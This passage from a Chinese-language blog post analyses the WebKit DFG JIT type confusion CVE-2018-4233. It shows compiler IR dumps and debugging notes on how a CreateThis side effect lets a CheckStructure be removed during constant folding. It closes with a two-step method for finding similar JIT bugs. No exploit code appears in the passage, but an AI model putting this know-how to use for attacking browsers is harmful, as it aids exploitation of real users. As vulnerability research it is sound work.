ProxyObject</span></span><br><span class="line">24:&lt;!0:-&gt; MovHint(Untyped:@23, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">25:&lt; 1:-&gt; SetLocal(Untyped:@23, loc5(L~&lt;Object&gt;/FlushedJSValue), W:Stack(-6), bc<span class="comment">#7, exit: bc#10, ExitValid) predicting ProxyObject</span></span><br><span class="line">26:&lt; 1:-&gt; CreateThis(Cell:@23, JS|UseAsOther, Final, R:HeapObjectCount,MiscFields, W:HeapObjectCount, Exits, ClobbersExit, bc<span class="comment">#10, ExitValid)</span></span><br><span class="line">27:&lt;!0:-&gt; MovHint(Untyped:@26, MustGen, this, W:SideState, ClobbersExit, bc<span class="comment">#10, ExitInvalid)</span></span><br><span class="line">28:&lt; 1:-&gt; SetLocal(Untyped:@26, this(M!&lt;Final&gt;/FlushedJSValue), W:Stack(5), bc<span class="comment">#10, exit: bc#15, ExitValid) predicting Final</span></span><br><span class="line">29:&lt;!0:-&gt; Check(MustGen, Array, bc<span class="comment">#15, ExitValid)</span></span><br><span class="line">30:&lt;!0:-&gt; CheckNotEmpty(Untyped:@42, MustGen, Exits, bc<span class="comment">#15, ExitValid)</span></span><br><span class="line">31:&lt; 1:-&gt; JSConstant(JS|PureNum|UseAsOther|UseAsInt|ReallyWantsInt, BoolInt32, Int32: 0, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">32:&lt;!0:-&gt; GetLocal(Untyped:@2, JS|MustGen|UseAsOther, NonIntAsdouble, arg2(C~&lt;Double&gt;/FlushedJSValue), R:Stack(7), bc<span class="comment">#17, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">38:&lt;!0:-&gt; CheckStructure(Cell:@42, MustGen, [%Dy:Array], R:JSCell_structureID, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">39:&lt; 1:-&gt; GetButterfly(Cell:@42, Storage|PureInt, R:JSObject_butterfly, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">40:&lt; 1:-&gt; DoubleRep(Check:RealNumber:@32, Double|PureInt, BytecodeDouble, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">33:&lt;!0:-&gt; PutByVal(KnownCell:@42, Int32:@31, DoubleRepReal:@40&lt;Double&gt;, Untyped:@39, MustGen|VarArgs, Double+OriginalArray+InBounds+AsIs, R:Butterfly_publicLength,Butterfly_vectorLength,IndexedDoubleProperties, W:IndexedDoubleProperties, Exits, ClobbersExit, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">34:&lt;!0:-&gt; Return(Untyped:@26, MustGen, W:SideState, Exits, bc<span class="comment">#22, ExitValid)</span></span><br><span class="line">35:&lt;!0:-&gt; Flush(Check:Untyped:@2, MustGen|IsFlushed, arg2(C~&lt;Double&gt;/FlushedJSValue), R:Stack(7), W:SideState, bc<span class="comment">#22, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">36:&lt;!0:-&gt; Flush(Check:Untyped:@1, MustGen|IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), W:SideState, bc<span class="comment">#22, ExitValid) predicting Array</span></span><br><span class="line">37:&lt;!0:-&gt; Check(MustGen, bc<span class="comment">#22, ExitValid)</span></span><br><span class="line">States: InvalidBranchDirection, StructuresAreWatched, CFAInvalidated</span><br><span class="line">Vars After:</span><br><span class="line">Var Links: arg2:@32 arg1:@42 arg0:@28 loc0:@5 loc1:@7 loc2:@9 loc3:@19 loc4:@21 loc5:@25</span><br><span class="line"></span><br><span class="line">GC Values:</span><br><span class="line">Weak:Object: 0x10000e4000 with butterfly 0x0 (Structure %Bl:JSLexicalEnvironment), StructureID: 73</span><br><span class="line">Weak:Object: 0x11cd74000 with butterfly 0x10000fe668 (Structure %En:Function), StructureID: 290</span><br><span class="line">Desired watchpoints:</span><br><span class="line">Watchpoint sets:</span><br><span class="line">Inline watchpoint sets: 0x11cdf3080, 0x11cdf1fe0, 0x11cdf0060, 0x11cdf27c0, 0x11cdf0760, 0x11cd701b0, 0x11cdf01b0</span><br><span class="line">Inferred values: 0x11cdd8f00</span><br><span class="line">Buffer views:</span><br><span class="line">Object property conditions:</span><br><span class="line">Inferred types:</span><br><span class="line">Structures:</span><br><span class="line">%Bl:JSLexicalEnvironment = 0x11cdf1f80:[JSLexicalEnvironment, &#123;&#125;, NonArray, Leaf]</span><br><span class="line">%Dy:Array = 0x11cdf2760:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x11cdb4090, Leaf]</span><br><span class="line">%En:Function = 0x11cd70150:[Function, &#123;prototype:100&#125;, NonArray, Proto:0x11cdd0000, Leaf]</span><br><span class="line"></span><br><span class="line">Beginning DFG phase CFG simplification.</span><br><span class="line">(After constant folding and)Before CFG simplification:</span><br><span class="line"></span><br><span class="line">DFG <span class="keyword">for</span> assign<span class="comment">#Ei5h05:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24]:</span></span><br><span class="line">Fixpoint state: FixpointNotConverged; Form: ThreadedCPS; Unification state: GloballyUnified; Ref count state: EverythingIsLive</span><br><span class="line">Arguments <span class="keyword">for</span> block<span class="comment">#0: @0, @1, @2</span></span><br><span class="line"></span><br><span class="line">Block <span class="comment">#0 (bc#0): (OSR target)</span></span><br><span class="line">Execution count: 1.000000</span><br><span class="line">Predecessors:</span><br><span class="line">Successors:</span><br><span class="line">Dominated by: <span class="comment">#root #0</span></span><br><span class="line">Dominates: <span class="comment">#0</span></span><br><span class="line">Dominance Frontier:</span><br><span class="line">Iterated Dominance Frontier:</span><br><span class="line">States: StructuresAreWatched</span><br><span class="line">Vars Before: arg2:(Top|Empty, TOP, TOP) arg1:(Cell|Empty, TOP, TOP) arg0:(Cell|Empty, TOP, TOP)</span><br><span class="line">Intersected Vars Before: arg2:(Top|Empty, TOP, TOP) arg1:(Cell|Empty, TOP, TOP) arg0:(Cell|Empty, TOP, TOP)</span><br><span class="line">Var Links: arg2:@2 arg1:@1 arg0:@0</span><br><span class="line">0:&lt; 1:-&gt; SetArgument(this(a), W:SideState, bc<span class="comment">#0, ExitValid) predicting ProxyObject</span></span><br><span class="line">1:&lt; 1:-&gt; SetArgument(IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), W:SideState, bc<span class="comment">#0, ExitValid) predicting Array</span></span><br><span class="line">42:&lt;!0:-&gt; GetLocal(Untyped:@1, JS|MustGen|PureInt, Array, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), bc<span class="comment">#0, ExitValid) predicting Array</span></span><br><span class="line">44:&lt;!0:-&gt; AssertNotEmpty(Check:Untyped:@42, MustGen, W:SideState, Exits, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">43:&lt;!0:-&gt; CheckStructure(Cell:@42, MustGen, [%Dy:Array], R:JSCell_structureID, Exits, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">2:&lt; 1:-&gt; SetArgument(IsFlushed, arg2(C~&lt;Double&gt;/FlushedJSValue), W:SideState, bc<span class="comment">#0, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">3:&lt; 1:-&gt; JSConstant(JS|PureInt, Other, Undefined, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">4:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc0, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">5:&lt; 1:-&gt; SetLocal(Untyped:@3, loc0(D~&lt;Other&gt;/FlushedJSValue), W:Stack(-1), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">6:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc1, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">7:&lt; 1:-&gt; SetLocal(Untyped:@3, loc1(E~&lt;Other&gt;/FlushedJSValue), W:Stack(-2), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">8:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc2, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">9:&lt; 1:-&gt; SetLocal(Untyped:@3, loc2(F~&lt;Other&gt;/FlushedJSValue), W:Stack(-3), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">10:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">11:&lt; 1:-&gt; SetLocal(Untyped:@3, loc3(G~&lt;Other&gt;/FlushedJSValue), W:Stack(-4), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">12:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">13:&lt; 1:-&gt; SetLocal(Untyped:@3, loc4(H~&lt;Other&gt;/FlushedJSValue), W:Stack(-5), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">14:&lt;!0:-&gt; MovHint(Untyped:@3, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">15:&lt; 1:-&gt; SetLocal(Untyped:@3, loc5(I~&lt;Other&gt;/FlushedJSValue), W:Stack(-6), bc<span class="comment">#0, ExitInvalid) predicting Other</span></span><br><span class="line">16:&lt; 1:-&gt; JSConstant(JS|PureInt, Function, Weak:Object: 0x11cd74000 with butterfly 0x10000fe668 (Structure %En:Function), StructureID: 290, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">17:&lt; 1:-&gt; JSConstant(JS|PureInt, OtherObj, Weak:Object: 0x10000e4000 with butterfly 0x0 (Structure %Bl:JSLexicalEnvironment), StructureID: 73, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">18:&lt;!0:-&gt; MovHint(Untyped:@17, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">19:&lt; 1:-&gt; SetLocal(Untyped:@17, loc3(J~&lt;Object&gt;/FlushedJSValue), W:Stack(-4), bc<span class="comment">#1, exit: bc#3, ExitValid) predicting OtherObj</span></span><br><span class="line">20:&lt;!0:-&gt; MovHint(Untyped:@17, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#3, ExitValid)</span></span><br><span class="line">21:&lt; 1:-&gt; SetLocal(Untyped:@17, loc4(K~&lt;Object&gt;/FlushedJSValue), W:Stack(-5), bc<span class="comment">#3, exit: bc#6, ExitValid) predicting OtherObj</span></span><br><span class="line">22:&lt;!0:-&gt; CheckTraps(MustGen, W:Watchpoint_fire, Exits, ClobbersExit, bc<span class="comment">#6, ExitValid)</span></span><br><span class="line">41:&lt;!0:-&gt; InvalidationPoint(MustGen, W:SideState, Exits, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">23:&lt;!0:-&gt; GetLocal(Untyped:@0, JS|MustGen|UseAsOther, ProxyObject, this(a), R:Stack(5), bc<span class="comment">#7, ExitValid) predicting ProxyObject</span></span><br><span class="line">24:&lt;!0:-&gt; MovHint(Untyped:@23, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">25:&lt; 1:-&gt; SetLocal(Untyped:@23, loc5(L~&lt;Object&gt;/FlushedJSValue), W:Stack(-6), bc<span class="comment">#7, exit: bc#10, ExitValid) predicting ProxyObject</span></span><br><span class="line">26:&lt; 1:-&gt; CreateThis(Cell:@23, JS|UseAsOther, Final, R:HeapObjectCount,MiscFields, W:HeapObjectCount, Exits, ClobbersExit, bc<span class="comment">#10, ExitValid)</span></span><br><span class="line">27:&lt;!0:-&gt; MovHint(Untyped:@26, MustGen, this, W:SideState, ClobbersExit, bc<span class="comment">#10, ExitInvalid)</span></span><br><span class="line">28:&lt; 1:-&gt; SetLocal(Untyped:@26, this(M!&lt;Final&gt;/FlushedJSValue), W:Stack(5), bc<span class="comment">#10, exit: bc#15, ExitValid) predicting Final</span></span><br><span class="line">29:&lt;!0:-&gt; Check(MustGen, Array, bc<span class="comment">#15, ExitValid)</span></span><br><span class="line">30:&lt;!0:-&gt; Check(MustGen, bc<span class="comment">#15, ExitValid)</span></span><br><span class="line">31:&lt; 1:-&gt; JSConstant(JS|PureNum|UseAsOther|UseAsInt|ReallyWantsInt, BoolInt32, Int32: 0, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">32:&lt;!0:-&gt; GetLocal(Untyped:@2, JS|MustGen|UseAsOther, NonIntAsdouble, arg2(C~&lt;Double&gt;/FlushedJSValue), R:Stack(7), bc<span class="comment">#17, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">38:&lt;!0:-&gt; Check(MustGen, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">39:&lt; 1:-&gt; GetButterfly(Cell:@42, Storage|PureInt, R:JSObject_butterfly, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">40:&lt; 1:-&gt; DoubleRep(Check:RealNumber:@32, Double|PureInt, BytecodeDouble, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">33:&lt;!0:-&gt; PutByVal(KnownCell:@42, Int32:@31, DoubleRepReal:@40&lt;Double&gt;, Untyped:@39, MustGen|VarArgs, Double+OriginalArray+InBounds+AsIs, R:Butterfly_publicLength,Butterfly_vectorLength,IndexedDoubleProperties, W:IndexedDoubleProperties, Exits, ClobbersExit, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">34:&lt;!0:-&gt; Return(Untyped:@26, MustGen, W:SideState, Exits, bc<span class="comment">#22, ExitValid)</span></span><br><span class="line">35:&lt;!0:-&gt; Flush(Check:Untyped:@2, MustGen|IsFlushed, arg2(C~&lt;Double&gt;/FlushedJSValue), R:Stack(7), W:SideState, bc<span class="comment">#22, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">36:&lt;!0:-&gt; Flush(Check:Untyped:@1, MustGen|IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), W:SideState, bc<span class="comment">#22, ExitValid) predicting Array</span></span><br><span class="line">37:&lt;!0:-&gt; Check(MustGen, bc<span class="comment">#22, ExitValid)</span></span><br><span class="line">States: InvalidBranchDirection, StructuresAreWatched, CFAInvalidated</span><br><span class="line">Vars After:</span><br><span class="line">Var Links: arg2:@32 arg1:@42 arg0:@28 loc0:@5 loc1:@7 loc2:@9 loc3:@19 loc4:@21 loc5:@25</span><br><span class="line"></span><br><span class="line">GC Values:</span><br><span class="line">Weak:Object: 0x10000e4000 with butterfly 0x0 (Structure %Bl:JSLexicalEnvironment), StructureID: 73</span><br><span class="line">Weak:Object: 0x11cd74000 with butterfly 0x10000fe668 (Structure %En:Function), StructureID: 290</span><br><span class="line">Desired watchpoints:</span><br><span class="line">Watchpoint sets:</span><br><span class="line">Inline watchpoint sets: 0x11cdf3080, 0x11cdf1fe0, 0x11cdf0060, 0x11cdf27c0, 0x11cdf0760, 0x11cd701b0, 0x11cdf01b0</span><br><span class="line">Inferred values: 0x11cdd8f00</span><br><span class="line">Buffer views:</span><br><span class="line">Object property conditions:</span><br><span class="line">Inferred types:</span><br><span class="line">Structures:</span><br><span class="line">%Bl:JSLexicalEnvironment = 0x11cdf1f80:[JSLexicalEnvironment, &#123;&#125;, NonArray, Leaf]</span><br><span class="line">%Dy:Array = 0x11cdf2760:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x11cdb4090, Leaf]</span><br><span class="line">%En:Function = 0x11cd70150:[Function, &#123;prototype:100&#125;, NonArray, Proto:0x11cdd0000, Leaf]</span><br></pre></td></tr></table></figure>
<p>可以发现，GetButterfly之前的CheckStructure在常量折叠过程被优化掉了；对比clobberWorld版本，GetButterfly之前的CheckStructure仍保留。因此clobberWorld最终影响了constant folding phase。</p>
<p>跟踪constant folding phase，第187行的node-&gt;remove(m_graph)直接导致CheckStructure从IR的控制流图中被删除：</p>
<p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102151417012-6413257.png" alt="image-20190102151417012"></p>
<p>进入if结构需要满足185行的if表达式为真，那么value.m_structure.isSubsetOf(set)就很重要了。</p>
<p>重新调试，为了找到对clobberWorld的调用，在DFG::AbstractInterpreterInlines.h的executeEffects函数case CreateThis选项下断点。发现停在了CFA phase(Control Flow Analysis)阶段，而这几个phase的顺序是：</p>
<p>invalidationpoint injection -&gt; structure check hoisting -&gt; strength reduction -&gt; cps rethreading -&gt; cfa -&gt; constant folding</p>
<p>executeEffects是在CFA阶段内发生的，那么CFA之前的阶段不需要关注。</p>
<p>跟进clobberWorld，在多层的调用中，有对m_set.setReservedFlag的赋值：</p>
<p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102152930069-6414170.png" alt="image-20190102152930069"></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uintptr_t</span> reservedFlag = <span class="number">2</span>;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setReservedFlag</span><span class="params">(<span class="keyword">bool</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value)</span><br><span class="line">    	m_pointer |= reservedFlag;</span><br><span class="line"> 	<span class="keyword">else</span></span><br><span class="line">      	m_pointer &amp;= ~reservedFlag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后，在constant folding phase：</p>
<p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102153202255-6414322.png" alt="image-20190102153202255"></p>
<p>跟进value.m_structure.isSubsetof(set)：</p>
<p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102153329999-6414410.png" alt="image-20190102153329999"></p>
<p>由此解决了clobberWorld在AbstractInterpreter的前后呼应问题。</p>
<h3 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h3><p>CVE-2018-4233可以总结为CreateThis side effect导致的类型混淆漏洞，补丁修改了两处位置，AbstractInterpreter、Clobberize，这两处的任意一个均可以使PoC失效。相比2017年Moblie Pwn2Own中Vulcan团队使用的GetPropertyEnumerator/HasGenericProperty side effect漏洞的补丁，这个补丁更加全面地展示了这个漏洞的模式和面貌。挖掘出这种类型的漏洞，只需要两步：</p>
<ul>
<li>寻找具有回调特性的DFG IR</li>
<li>寻找DFG IR的模型问题</li>
</ul>
<p>然后就可以尝试构造漏洞了。</p>
</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-11-23</span><i class="fa fa-tag"></i></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,dwfault.ml/2019/11/23/CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion/,dwfault,CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2019/11/23/WebKit JavaScriptCore的特殊调试技巧/" title="WebKit JavaScriptCore的特殊调试技巧">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2019/11/23/CVE-2018-4162 CompareEq side effect/" title="CVE-2018-4162 CompareEq side effect">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>